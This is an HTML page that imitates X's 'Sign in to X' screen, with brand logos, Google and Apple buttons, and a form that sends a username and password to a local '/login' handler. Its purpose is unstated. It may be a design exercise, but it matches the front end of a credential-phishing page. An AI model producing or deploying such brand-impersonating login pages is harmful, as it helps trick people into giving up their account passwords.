<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In to X</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .header {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .button {
            background-color: #fff;
            color: #000;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 25px;
            cursor: pointer;
            margin: 10px 0;
            width: 100%;
        }
        .button.apple {
            background-color: #000;
            color: #fff;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            background-color: #333;
            border: 1px solid #444;
            color: white;
            border-radius: 25px;
        }
        .link {
            color: lightgray;
            text-decoration: none;
            font-size: 14px;
        }
        .footer {
            font-size: 14px;
            margin-top: 10px;
        }
        .divider {
            color: gray;
            margin: 15px 0;
        }

	.logo {
	    position: absolute;
            top: 20px;
            left: 20px;
            width: 40px;
            height: 40px;
	}	

    </style>
</head>
<body>
	<!-- x logo-->
   <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/X_logo.jpg" alt="x logo" class="logo">

    <div class="container">
        <!-- Header -->
        <div class="header">Sign in to X</div>

        <!-- Sign in with Google Button -->
        <button class="button">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1280px-Google_%22G%22_logo.svg.png" alt="Google" width="20"> Sign in with Google
        </button>

        <!-- Sign in with Apple Button -->
        <button class="button">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" width="20"> Sign in with Apple
        </button>
        <!-- Or divider -->
        <div class="divider">or</div>

<form method="POST" action="/login">
        <!-- Input field for email/username -->
        <input type="text" class="input-field" name="username" placeholder="Phone, email, or username" required>

        <!-- Input field for password -->
        <input type="password" class="input-field" name="password" placeholder="Password" required>

        <!-- Next Button -->
        <button type="submit"  class="button">Log in</button>
</form>
        <!-- Forgot password link -->
        <div><a href="#" class="link">Forgot password?</a></div>

        <!-- Footer -->
        <div class="footer">
            Don't have an account? <a href="#" class="link">Sign up</a>
        </div>
    </div>

</body>
</html>
